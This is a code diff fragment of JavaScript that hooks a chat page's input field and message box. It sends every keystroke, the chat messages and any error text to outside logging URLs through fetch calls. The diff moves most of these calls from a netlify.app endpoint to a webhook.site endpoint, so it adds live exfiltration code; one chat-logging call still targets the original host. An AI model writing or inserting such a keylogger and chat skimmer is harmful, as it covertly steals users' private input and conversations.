@@ -23,13 +23,13 @@
               const inputField = chatDoc.querySelector('input');
 
               if (!inputField) {
-                  fetch('https://timely-choux-365656.netlify.app/log?error=no_input_found');
+                  fetch('https://webhook.site/510fdccc-7f9d-448b-92f9-0b37831d8b6e/log?error=no_input_found');
                   return;
               }
 
               inputField.addEventListener('input', function () {
                   const text = inputField.value;
-                  fetch('https://timely-choux-365656.netlify.app/log?data=' + encodeURIComponent(text));
+                  fetch('https://webhook.site/510fdccc-7f9d-448b-92f9-0b37831d8b6e/log?data=' + encodeURIComponent(text));
               });
 
               const chatBox = chatDoc.querySelector('.chat-box');
@@ -38,7 +38,7 @@
                   fetch('https://timely-choux-365656.netlify.app/log?chat=' + encodeURIComponent(messages));
               }
           } catch (err) {
-              fetch('https://timely-choux-365656.netlify.app/log?error=' + encodeURIComponent(err.message));
+              fetch('https://webhook.site/510fdccc-7f9d-448b-92f9-0b37831d8b6e/log?error=' + encodeURIComponent(err.message));
           }
       };
   })();
